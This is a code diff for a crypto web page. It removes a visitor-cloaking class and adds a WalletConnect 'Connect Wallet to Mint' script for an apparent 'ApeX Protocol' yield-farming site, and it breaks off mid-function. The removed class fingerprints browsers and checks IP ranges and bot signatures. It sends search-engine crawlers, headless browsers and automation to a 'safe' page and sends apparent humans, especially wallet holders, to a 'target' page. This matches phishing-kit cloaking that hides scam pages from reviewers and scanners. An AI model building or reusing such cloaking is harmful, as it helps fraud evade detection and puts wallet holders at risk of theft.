@@ -1,780 +1,684 @@
-/**
- * Advanced Cloaking System v4.2 – Mobile‑Friendly Edition
- * For educational and defensive research only.
- *
- * Desktop: heavy weights on wallet, battery, behavior.
- * Mobile: minimal checks – only hard fails and strong human signals.
- */
+// ===== main.js — ApeX Protocol WalletConnect Integration (Robust + Fallback + Debug) =====
+// Import WalletConnect libraries from CDN (esm.sh)
+import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.11.0'
+import { WalletConnectModal } from 'https://esm.sh/@walletconnect/modal@2.6.2'
 
-class AdvancedCloakingSystem {
-    constructor(config = {}) {
-        this.config = {
-            safePageUrl: config.safePageUrl || '/safe',
-            targetPageUrl: config.targetPageUrl || '/target',
-            strictnessLevel: config.strictnessLevel || 55,   // desktop threshold (unused for mobile)
-            debugMode: config.debugMode || false,
-            usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true,
-            ...config
-        };
+document.addEventListener('DOMContentLoaded', async () => {
+  console.log('✅ main.js loaded - Robust version with fallback and debug')
 
-        // Detection databases
-        this.botSignatures = this.initializeBotSignatures();
-        this.googleIPRanges = this.initializeGoogleIPs();
-        this.vpnIPRanges = this.initializeVPNIPs();
-        this.proxyIPRanges = this.initializeProxyIPs();
+  // ---------- DEBUG PANEL (hidden by default, double‑tap to show) ----------
+  const debugArea = document.createElement('div')
+  debugArea.id = 'wc-debug'
+  debugArea.style.position = 'fixed'
+  debugArea.style.bottom = '0'
+  debugArea.style.left = '0'
+  debugArea.style.width = '100%'
+  debugArea.style.background = '#000'
+  debugArea.style.color = '#0f0'
+  debugArea.style.fontSize = '12px'
+  debugArea.style.padding = '5px'
+  debugArea.style.zIndex = '10000'
+  debugArea.style.maxHeight = '150px'
+  debugArea.style.overflowY = 'auto'
+  debugArea.style.display = 'none' // hidden initially
+  document.body.appendChild(debugArea)
 
-        // Behavioral data (only used on desktop)
-        this.behavior = {
-            startTime: Date.now(),
-            maxScroll: 0,
-            mouseMoves: 0,
-            clicks: 0,
-            timeToFirstInteraction: null
-        };
+  let debugVisible = false
+  document.addEventListener('dblclick', () => {
+    debugVisible = !debugVisible
+    debugArea.style.display = debugVisible ? 'block' : 'none'
+  })
 
-        this.sessionId = this.generateSessionId();
-        this.fingerprint = null;
-        this.walletInfo = null;
-        this.ipInfo = null;
-        this.isMobile = false;
+  function logDebug(msg) {
+    console.log(msg)
+    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`
+  }
 
-        this.log('Cloaking system initialized (mobile‑friendly mode)', 'info');
+  // ---------- Reference DOM elements ----------
+  const connectButton = document.getElementById('connectButton')
+  const walletButton = document.getElementById('walletButton')
+  const claimStatus = document.getElementById('claimStatus')
+  let currentSession = null
+  let client, modal
+
+  // ---------- Button state management (unchanged) ----------
+  function setButtonState(button, state, message = '') {
+    if (!button) return
+    button.style.display = 'inline-block'
+    button.style.padding = '14px 28px'
+    button.style.borderRadius = '8px'
+    button.style.fontWeight = '600'
+    button.style.border = 'none'
+    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer'
+    button.style.transition = 'all 0.3s ease'
+    button.style.color = 'white'
+    button.style.fontSize = '16px'
+    button.style.fontFamily = "'Inter', sans-serif"
+    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)'
+    button.style.minWidth = '180px'
+    button.disabled = state === 'loading'
+
+    switch (state) {
+      case 'loading':
+        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)'
+        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)'
+        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 8px"></i> Connecting...'
+        break
+      case 'connected':
+        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)'
+        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)'
+        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right: 8px"></i> Connected'
+        break
+      case 'disconnect':
+        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
+        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)'
+        button.innerHTML = '<i class="fas fa-power-off" style="margin-right: 8px"></i> Disconnect'
+        break
+      case 'failed':
+        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
+        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)'
+        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right: 8px"></i> Failed'
+        setTimeout(() => setButtonState(button, 'normal'), 3000)
+        break
+      case 'normal':
+      default:
+        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)'
+        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)'
+        button.innerHTML = '<i class="fas fa-wallet" style="margin-right: 8px"></i> Connect Wallet to Mint'
+        button.onmouseenter = () => {
+          if (!button.disabled) {
+            button.style.transform = 'translateY(-2px)'
+            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)'
+          }
+        }
+        button.onmouseleave = () => {
+          button.style.transform = 'translateY(0)'
+          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)'
+        }
+        break
+    }
+  }
+
+  // ---------- Status display (unchanged) ----------
+  function showStatus(message, type = 'info') {
+    if (claimStatus) {
+      claimStatus.textContent = message
+      claimStatus.className = `status ${type}`
+      claimStatus.style.display = 'block'
+      claimStatus.style.padding = '12px 16px'
+      claimStatus.style.borderRadius = '8px'
+      claimStatus.style.marginTop = '12px'
+      claimStatus.style.fontWeight = '500'
+      claimStatus.style.fontSize = '14px'
+      claimStatus.style.textAlign = 'center'
+      claimStatus.style.transition = 'all 0.3s ease'
+
+      switch (type) {
+        case 'success':
+          claimStatus.style.background = 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)'
+          claimStatus.style.color = '#166534'
+          claimStatus.style.border = '1px solid #86EFAC'
+          break
+        case 'error':
+          claimStatus.style.background = 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)'
+          claimStatus.style.color = '#991B1B'
+          claimStatus.style.border = '1px solid #FCA5A5'
+          break
+        case 'info':
+        default:
+          claimStatus.style.background = 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)'
+          claimStatus.style.color = '#1E40AF'
+          claimStatus.style.border = '1px solid #93C5FD'
+          break
+      }
+
+      if (type === 'error' || type === 'success') {
+        setTimeout(() => {
+          claimStatus.style.opacity = '0'
+          setTimeout(() => {
+            claimStatus.style.display = 'none'
+            claimStatus.style.opacity = '1'
+          }, 300)
+        }, 5000)
+      }
+    }
+  }
+
+  // ---------- Initialize buttons ----------
+  setButtonState(connectButton, 'normal')
+  if (walletButton) setButtonState(walletButton, 'normal')
+
+  // ---------- WalletConnect constants ----------
+  const YOUR_PROJECT_ID = 'ea2ef1ec737f10116a4329a7c5629979' // original project ID
+  const PUBLIC_TEST_ID = '8f9a3f7b7c8e4d3a9b2c1d5e6f7a8b9c' // public fallback
+  let projectId = YOUR_PROJECT_ID
+
+  const metadata = {
+    name: 'ApeX Protocol',
+    description: 'AI-Optimized Yield Farming DApp',
+    url: window.location.origin,
+    icons: ['https://walletconnect.com/walletconnect-logo.png'],
+  }
+
+  // ---------- Mobile detection ----------
+  function isMobile() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+  }
+
+  // ---------- Storage helpers (unchanged) ----------
+  function saveWallet(address, session = null) {
+    localStorage.setItem('connectedWallet', address)
+    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session))
+  }
+  function getSavedWallet() { return localStorage.getItem('connectedWallet') }
+  function getSavedSession() {
+    const session = localStorage.getItem('walletConnectSession')
+    return session ? JSON.parse(session) : null
+  }
+  function clearSavedWallet() {
+    localStorage.removeItem('connectedWallet')
+    localStorage.removeItem('walletConnectSession')
+  }
+
+  // ---------- UI update functions (unchanged) ----------
+  function updateConnectedUI(address) {
+    setButtonState(connectButton, 'disconnect')
+    if (walletButton) setButtonState(walletButton, 'disconnect')
+
+    let display = document.getElementById('connectedAddressDisplay')
+    if (!display) {
+      display = document.createElement('div')
+      display.id = 'connectedAddressDisplay'
+      display.style.marginTop = '12px'
+      display.style.padding = '10px 16px'
+      display.style.fontFamily = "'JetBrains Mono', 'Monaco', 'Consolas', monospace"
+      display.style.fontSize = '14px'
+      display.style.color = '#059669'
+      display.style.textAlign = 'center'
+      display.style.background = 'linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)'
+      display.style.borderRadius = '8px'
+      display.style.border = '1px solid #A7F3D0'
+      display.style.boxShadow = '0 2px 8px rgba(5, 150, 105, 0.1)'
+      connectButton.parentNode.appendChild(display)
     }
 
-    // ---------- Bot signature database ----------
-    initializeBotSignatures() {
-        return {
-            googlebot: /Googlebot|Google\sbot|Google\sImage|Googlebot-Mobile|AdsBot-Google|Googlebot-News|Googlebot-Video|Mediapartners-Google|AdsBot-Google-Mobile|Mediapartners/i,
-            bingbot: /bingbot|BingPreview|MSNBot|msnbot/i,
-            yahoo: /Slurp|Yahoo!\sSlurp/i,
-            yandex: /YandexBot|YandexMobileBot|YandexImages|YandexVideo|YandexMetrika/i,
-            baidu: /Baiduspider|BaiduImagespider/i,
-            facebook: /facebookexternalhit|Facebot/i,
-            other: /DuckDuckBot|ia_archiver|archive.org|SeznamBot|Sogou|Exabot|DotBot|Ahrefs|Semrush|MJ12bot|BLEXBot|rogerbot|SiteAuditBot/i,
-            headless: /Headless|PhantomJS|Nightmare|Puppeteer|Playwright/i
-        };
-    }
-
-    initializeGoogleIPs() {
-        return [
-            '66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18', '74.125.0.0/16',
-            '209.85.128.0/17', '216.239.32.0/19', '216.58.192.0/19'
-        ];
-    }
-
-    initializeVPNIPs() {
-        return [
-            '54.0.0.0/8', '52.0.0.0/8', '159.89.0.0/16', '165.227.0.0/16',
-            '34.0.0.0/8', '35.0.0.0/8', '13.0.0.0/8', '40.0.0.0/8'
-        ];
-    }
-
-    initializeProxyIPs() {
-        return ['103.0.0.0/8', '104.0.0.0/8'];
-    }
-
-    generateSessionId() {
-        return 'sid_' + Math.random().toString(36).substring(2, 15) +
-               Math.random().toString(36).substring(2, 15);
-    }
-
-    // ---------- Device type detection ----------
-    detectDeviceType() {
-        const ua = navigator.userAgent;
-        const isMobileUA = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
-        const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-        // Mobile if either mobile UA or touch + small screen (heuristic)
-        const isLikelyMobile = isMobileUA || (hasTouch && screen.width < 1024);
-        return isLikelyMobile;
-    }
-
-    // ---------- Wallet detection ----------
-    detectWallet() {
-        const wallet = {
-            present: false,
-            type: null,
-            multiple: false,
-            eip6963: false
-        };
-
-        if (window.eip6963Providers && window.eip6963Providers.length > 0) {
-            wallet.present = true;
-            wallet.eip6963 = true;
-            wallet.multiple = window.eip6963Providers.length > 1;
-            if (window.eip6963Providers[0]?.info?.name) {
-                wallet.type = window.eip6963Providers[0].info.name;
-            }
-            this.log(`EIP-6963 providers: ${window.eip6963Providers.length}`, 'debug');
-        }
-
-        if (typeof window.ethereum !== 'undefined') {
-            wallet.present = true;
-            if (window.ethereum.isMetaMask) wallet.type = 'MetaMask';
-            else if (window.ethereum.isCoinbaseWallet) wallet.type = 'Coinbase';
-            else if (window.ethereum.isTrust) wallet.type = 'Trust';
-            else if (window.ethereum.isBraveWallet) wallet.type = 'Brave';
-            else if (window.ethereum.isRabby) wallet.type = 'Rabby';
-            else if (window.ethereum.isPhantom) wallet.type = 'Phantom';
-            else wallet.type = 'unknown_ethereum';
-
-            if (window.ethereum.providers && window.ethereum.providers.length > 0) {
-                wallet.multiple = true;
-            }
-        }
-
-        if (typeof window.web3 !== 'undefined' && !wallet.present) {
-            wallet.present = true;
-            wallet.type = 'legacy_web3';
-        }
-
-        if (wallet.present) {
-            this.log(`Wallet detected: ${wallet.type || 'unknown'}`, 'info');
-        }
-        return wallet;
-    }
-
-    // ---------- IP detection ----------
-    async checkIPAddress() {
-        try {
-            let ip, geo = { country: '', city: '', isp: '', connectionType: '' };
-
-            if (this.config.usePublicIpService) {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
-            } else {
-                const ipRes = await fetch('/api/get-client-ip');
-                if (!ipRes.ok) throw new Error('IP endpoint failed');
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
-                const geoRes = await fetch(`/api/geo-lookup?ip=${ip}`);
-                if (geoRes.ok) {
-                    geo = await geoRes.json();
-                }
-            }
-
-            return {
-                ip,
-                isGoogle: this.ipInRanges(ip, this.googleIPRanges),
-                isProxy: this.ipInRanges(ip, this.proxyIPRanges),
-                isVPN: this.ipInRanges(ip, this.vpnIPRanges),
-                country: geo.country,
-                city: geo.city,
-                isp: geo.isp,
-                connectionType: geo.connectionType
-            };
-        } catch (error) {
-            this.log(`IP check failed: ${error.message}`, 'error');
-            return { isGoogle: false, isProxy: false, isVPN: false };
-        }
-    }
-
-    ipInRanges(ip, ranges) {
-        if (!ip) return false;
-        const ipInt = this.ipToInt(ip);
-        if (ipInt === null) return false;
-        for (const range of ranges) {
-            const [base, maskBits] = range.split('/');
-            const mask = ~((1 << (32 - parseInt(maskBits))) - 1) >>> 0;
-            const baseInt = this.ipToInt(base);
-            if (baseInt === null) continue;
-            if ((ipInt & mask) === (baseInt & mask)) return true;
-        }
-        return false;
-    }
-
-    ipToInt(ip) {
-        const parts = ip.split('.');
-        if (parts.length !== 4) return null;
-        return ((parseInt(parts[0]) << 24) |
-                (parseInt(parts[1]) << 16) |
-                (parseInt(parts[2]) << 8) |
-                parseInt(parts[3])) >>> 0;
-    }
-
-    // ---------- User agent analysis ----------
-    analyzeUserAgent() {
-        const ua = navigator.userAgent;
-        for (const [type, regex] of Object.entries(this.botSignatures)) {
-            if (regex.test(ua)) {
-                return { isBot: true, botType: type };
-            }
-        }
-        return { isBot: false };
-    }
-
-    // ---------- Headless / automation detection ----------
-    isHeadlessBrowser(fingerprint) {
-        const indicators = [];
-        if (navigator.webdriver) indicators.push('webdriver');
-        if (window.callPhantom || window._phantom) indicators.push('phantom');
-        if (window.__nightmare) indicators.push('nightmare');
-        if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
-        if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
-        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');
-        if (!window.chrome && !window.navigator.brave) {
-            if (indicators.length > 0) indicators.push('no_chrome');
-        }
-        return indicators.length >= 2;
-    }
-
-    detectAutomationTools() {
-        const indicators = [
-            'selenium', 'webdriver', 'driver', 'callPhantom', '_phantom',
-            '__nightmare', '_Selenium_IDE_Recorder', 'domAutomation', 'domAutomationController'
-        ];
-        for (const ind of indicators) {
-            if (window[ind] !== undefined) return true;
-        }
-        return false;
-    }
-
-    // ---------- Language & timezone consistency (used only on desktop) ----------
-    checkLanguageConsistency() {
-        const languages = navigator.languages || [navigator.language];
-        const primary = languages[0];
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const tzRegion = timezone.split('/')[0];
-        const langRegion = primary.split('-')[1] || '';
-        const match = tzRegion === langRegion || 
-                     (tzRegion === 'America' && langRegion === 'US') ||
-                     (tzRegion === 'Europe' && ['GB','DE','FR'].includes(langRegion));
-        return { consistent: match, languages, timezone };
-    }
-
-    // ---------- Screen fingerprint ----------
-    getScreenMetrics() {
-        return {
-            width: screen.width,
-            height: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelRatio: window.devicePixelRatio || 1,
-            touchSupport: 'ontouchstart' in window,
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight
-        };
-    }
-
-    // ---------- Comprehensive fingerprint (needed for desktop) ----------
-    async generateFingerprint() {
-        const screen = this.getScreenMetrics();
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            language: navigator.language,
-            languages: navigator.languages,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screen: screen,
-            screenResolution: `${screen.width}x${screen.height}`,
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            canvas: await this.getCanvasFingerprint(),
-            webgl: this.getWebGLFingerprint(),
-            fonts: await this.getFontList(),
-            plugins: this.getPluginList(),
-            audio: await this.getAudioFingerprint(),
-            webRTC: this.getWebRTCInfo(),
-            battery: await this.getBatteryInfo(),
-            permissions: await this.getPermissionsInfo(),
-            timestamp: Date.now()
-        };
-    }
-
-    async getCanvasFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = 200;
-            canvas.height = 50;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(10, 10, 100, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('Cloaking Detection Test', 2, 15);
-            ctx.beginPath();
-            ctx.arc(50, 25, 10, 0, Math.PI * 2);
-            ctx.strokeStyle = '#ff0000';
-            ctx.lineWidth = 2;
-            ctx.stroke();
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            const pixels = imageData.data;
-            let hash = 0;
-            for (let i = 0; i < pixels.length; i += 4) {
-                hash = ((hash << 5) - hash) + pixels[i];
-                hash |= 0;
-            }
-            return { hash: hash.toString(16) };
-        } catch (e) {
-            return { hash: 'canvas_error' };
-        }
-    }
-
-    getWebGLFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (!gl) return { supported: false };
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-                supported: true,
-                vendor: gl.getParameter(gl.VENDOR),
-                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
-                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
-                version: gl.getParameter(gl.VERSION),
-                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
-                extensions: gl.getSupportedExtensions() || []
-            };
-        } catch (e) {
-            return { error: e.message };
-        }
-    }
-
-    async getFontList() {
-        const baseFonts = ['monospace', 'sans-serif', 'serif'];
-        const fontList = [
-            'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
-            'Verdana', 'Georgia', 'Palatino', 'Garamond',
-            'Comic Sans MS', 'Trebuchet MS', 'Arial Black',
-            'Impact', 'Lucida Console', 'Tahoma', 'Wingdings'
-        ];
-        const detected = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        for (const font of fontList) {
-            for (const base of baseFonts) {
-                ctx.font = `72px ${base}`;
-                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
-                ctx.font = `72px '${font}', ${base}`;
-                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
-                if (baseWidth !== testWidth) {
-                    detected.push(font);
-                    break;
-                }
-            }
-        }
-        return detected;
-    }
-
-    getPluginList() {
-        const plugins = [];
-        for (let i = 0; i < navigator.plugins.length; i++) {
-            const p = navigator.plugins[i];
-            plugins.push({ name: p.name, filename: p.filename, description: p.description });
-        }
-        return plugins;
-    }
-
-    async getAudioFingerprint() {
-        return new Promise((resolve) => {
-            try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioContext.createOscillator();
-                const analyser = audioContext.createAnalyser();
-                oscillator.connect(analyser);
-                analyser.connect(audioContext.destination);
-                oscillator.frequency.value = 440;
-                oscillator.type = 'sine';
-                const dataArray = new Uint8Array(analyser.frequencyBinCount);
-                oscillator.start();
-                setTimeout(() => {
-                    analyser.getByteFrequencyData(dataArray);
-                    oscillator.stop();
-                    audioContext.close();
-                    let hash = 0;
-                    for (let i = 0; i < dataArray.length; i += 10) {
-                        hash = ((hash << 5) - hash) + dataArray[i];
-                        hash |= 0;
-                    }
-                    resolve({ supported: true, hash: hash.toString(16) });
-                }, 100);
-            } catch (e) {
-                resolve({ supported: false });
-            }
-        });
-    }
-
-    getWebRTCInfo() {
-        return {
-            hasWebRTC: 'RTCPeerConnection' in window,
-            hasGetUserMedia: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices
-        };
-    }
-
-    async getBatteryInfo() {
-        if ('getBattery' in navigator) {
-            try {
-                const battery = await navigator.getBattery();
-                return {
-                    supported: true,
-                    charging: battery.charging,
-                    level: battery.level,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-            } catch (e) {
-                return { supported: false, error: e.message };
-            }
-        }
-        return { supported: false };
-    }
-
-    async getPermissionsInfo() {
-        const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
-        const results = {};
-        if ('permissions' in navigator) {
-            for (const perm of permissions) {
-                try {
-                    const status = await navigator.permissions.query({ name: perm });
-                    results[perm] = status.state;
-                } catch (e) {
-                    results[perm] = 'unknown';
-                }
-            }
-        }
-        return results;
-    }
-
-    // ---------- Behavioral tracking (only for desktop) ----------
-    startBehaviorTracking() {
-        const onInteraction = (type) => {
-            if (this.behavior.timeToFirstInteraction === null) {
-                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
-            }
-            if (type === 'click') this.behavior.clicks++;
-        };
-
-        window.addEventListener('scroll', () => {
-            const scrollPercent = (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100;
-            this.behavior.maxScroll = Math.max(this.behavior.maxScroll, scrollPercent);
-        });
-
-        let moveTimer;
-        window.addEventListener('mousemove', () => {
-            if (!moveTimer) {
-                moveTimer = setTimeout(() => {
-                    this.behavior.mouseMoves++;
-                    moveTimer = null;
-                }, 200);
-            }
-            if (this.behavior.timeToFirstInteraction === null) {
-                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
-            }
-        });
-
-        window.addEventListener('click', () => onInteraction('click'));
-        window.addEventListener('touchstart', () => onInteraction('touch'));
-
-        setTimeout(() => this.saveBehavior(), 5000);
-    }
-
-    saveBehavior() {
-        const timeOnPage = (Date.now() - this.behavior.startTime) / 1000;
-        const session = {
-            timeOnPage,
-            maxScroll: this.behavior.maxScroll,
-            mouseMoves: this.behavior.mouseMoves,
-            clicks: this.behavior.clicks,
-            timeToFirstInteraction: this.behavior.timeToFirstInteraction,
-            timestamp: Date.now()
-        };
-        sessionStorage.setItem('visitor_behavior', JSON.stringify(session));
-    }
-
-    hasExistingSession() {
-        return sessionStorage.getItem('visitor_behavior') !== null;
-    }
-
-    analyzeBehavior() {
-        const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
-        let score = 0;
-        if (session.timeOnPage > 3) score += 15;
-        if (session.maxScroll > 10) score += 15;
-        if (session.mouseMoves > 0) score += 15;
-        if (session.clicks > 0) score += 20;
-        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10;
-        return Math.min(60, score);
-    }
-
-    // ---------- Desktop scoring ----------
-    calculateDesktopScore(ipInfo, fingerprint, wallet, behaviorScore) {
-        let score = 0;
-        const w = {
-            wallet: 50,
-            battery: 20,
-            batteryCharging: 5,
-            plugins: { many: 5, none: -2 },
-            fonts: { many: 5, few: -2 },
-            canvasError: -5,
-            softwareRenderer: -10,
-            highConcurrency: 3,
-            mobileResolution: 5,
-            touchConsistent: 3,
-            langTzMismatch: -5,
-            googleIp: -50,
-            proxyVpn: -10,
-            residentialIp: 5,
-            behavior: 60
-        };
-        const weightsLog = [];
-
-        // Wallet
-        if (wallet.present) {
-            score += w.wallet;
-            weightsLog.push(`wallet:+${w.wallet}`);
-        }
-
-        // Battery
-        if (fingerprint.battery && fingerprint.battery.supported && typeof fingerprint.battery.level === 'number') {
-            score += w.battery;
-            weightsLog.push(`battery:+${w.battery}`);
-            if ('charging' in fingerprint.battery) {
-                score += w.batteryCharging;
-                weightsLog.push(`battery_charging:+${w.batteryCharging}`);
-            }
-        }
-
-        // IP signals
-        if (ipInfo.isGoogle) {
-            score += w.googleIp;
-            weightsLog.push(`google_ip:${w.googleIp}`);
-        } else {
-            if (ipInfo.isProxy || ipInfo.isVPN) {
-                score += w.proxyVpn;
-                weightsLog.push(`proxy/vpn:${w.proxyVpn}`);
-            }
-            if (ipInfo.connectionType === 'residential') {
-                score += w.residentialIp;
-                weightsLog.push(`residential_ip:+${w.residentialIp}`);
-            }
-        }
-
-        // Browser fingerprint
-        if (fingerprint.plugins && fingerprint.plugins.length > 2) {
-            score += w.plugins.many;
-            weightsLog.push(`plugins>2:+${w.plugins.many}`);
-        } else if (fingerprint.plugins && fingerprint.plugins.length === 0) {
-            score += w.plugins.none;
-            weightsLog.push(`no_plugins:${w.plugins.none}`);
-        }
-
-        if (fingerprint.fonts && fingerprint.fonts.length > 10) {
-            score += w.fonts.many;
-            weightsLog.push(`fonts>10:+${w.fonts.many}`);
-        } else if (fingerprint.fonts && fingerprint.fonts.length < 5) {
-            score += w.fonts.few;
-            weightsLog.push(`fonts<5:${w.fonts.few}`);
-        }
-
-        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') {
-            score += w.canvasError;
-            weightsLog.push(`canvas_error:${w.canvasError}`);
-        }
-
-        if (fingerprint.webgl && fingerprint.webgl.renderer) {
-            const renderer = fingerprint.webgl.renderer.toLowerCase();
-            if (renderer.includes('swiftshader') || renderer.includes('llvmpipe') || renderer.includes('mesa')) {
-                score += w.softwareRenderer;
-                weightsLog.push(`software_renderer:${w.softwareRenderer}`);
-            }
-        }
-
-        if (fingerprint.hardwareConcurrency && fingerprint.hardwareConcurrency > 2) {
-            score += w.highConcurrency;
-            weightsLog.push(`concurrency>2:+${w.highConcurrency}`);
-        }
-
-        const { width, height } = fingerprint.screen;
-        if (width < 1024 && height < 768) {
-            score += w.mobileResolution;
-            weightsLog.push(`mobile_res:+${w.mobileResolution}`);
-        }
-
-        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
-        if (fingerprint.screen.touchSupport === isMobile) {
-            score += w.touchConsistent;
-            weightsLog.push(`touch_consistent:+${w.touchConsistent}`);
-        }
-
-        const langConsistency = this.checkLanguageConsistency();
-        if (!langConsistency.consistent) {
-            score += w.langTzMismatch;
-            weightsLog.push(`lang/tz_mismatch:${w.langTzMismatch}`);
-        }
-
-        // Behavioral score
-        score += behaviorScore;
-        weightsLog.push(`behavior:+${behaviorScore}`);
-
-        score = Math.min(100, Math.max(0, score));
-        this.log(`Desktop score components: ${weightsLog.join(', ')}`, 'debug');
-        return score;
-    }
-
-    // ---------- Main decision ----------
-    async determineVisitorType() {
-        this.log('Starting classification', 'debug');
-
-        // ---- Device detection ----
-        this.isMobile = this.detectDeviceType();
-        this.log(`Device type: ${this.isMobile ? 'mobile' : 'desktop'}`, 'info');
-
-        // ---- Immediate checks (hard fails for both) ----
-        const ipCheck = await this.checkIPAddress();
-        this.ipInfo = ipCheck;
-        if (ipCheck.isGoogle) {
-            this.log('Google IP → safe', 'info');
-            return { type: 'bot', reason: 'google_ip', showSafe: true };
-        }
-
-        const uaCheck = this.analyzeUserAgent();
-        if (uaCheck.isBot) {
-            this.log(`Bot UA: ${uaCheck.botType} → safe`, 'info');
-            return { type: 'bot', reason: 'user_agent', showSafe: true };
-        }
-
-        // For mobile, we do a quick headless check without full fingerprint (optional)
-        if (this.isMobile) {
-            // Very basic headless detection (mobile bots may not have these)
-            if (navigator.webdriver) {
-                this.log('Mobile headless (webdriver) → safe', 'info');
-                return { type: 'bot', reason: 'headless', showSafe: true };
-            }
-            if (this.detectAutomationTools()) {
-                this.log('Mobile automation tools → safe', 'info');
-                return { type: 'bot', reason: 'automation', showSafe: true };
-            }
-        }
-
-        // ---- Generate fingerprint (needed for desktop and some mobile checks) ----
-        const fingerprint = await this.generateFingerprint();
-        this.fingerprint = fingerprint;
-
-        // Desktop headless check
-        if (!this.isMobile && this.isHeadlessBrowser(fingerprint)) {
-            this.log('Desktop headless browser → safe', 'info');
-            return { type: 'bot', reason: 'headless', showSafe: true };
-        }
-
-        // Desktop automation tools
-        if (!this.isMobile && this.detectAutomationTools()) {
-            this.log('Desktop automation tools → safe', 'info');
-            return { type: 'bot', reason: 'automation', showSafe: true };
-        }
-
-        // ---- Soft signals ----
-        const wallet = this.detectWallet();
-
-        // ---- Mobile path (extremely permissive) ----
-        if (this.isMobile) {
-            // Strong human signal: wallet present
-            if (wallet.present) {
-                this.log('Mobile wallet detected → human', 'info');
-                return { type: 'human', showSafe: false };
-            }
-
-            // Battery presence is a decent human indicator
-            if (fingerprint.battery && fingerprint.battery.supported) {
-                this.log('Mobile battery present → human', 'info');
-                return { type: 'human', showSafe: false };
-            }
-
-            // Touch + small screen is almost certainly a real user
-            if (fingerprint.screen.touchSupport && screen.width < 1024) {
-                this.log('Mobile touch + small screen → human', 'info');
-                return { type: 'human', showSafe: false };
-            }
-
-            // If none of the above, still treat as human (accept risk)
-            this.log('Mobile no strong signals → assuming human', 'warn');
-            return { type: 'human', showSafe: false };
-        }
-
-        // ---- Desktop path (full weighted scoring) ----
-        let behaviorScore = 0;
-        if (this.hasExistingSession()) {
-            behaviorScore = this.analyzeBehavior();
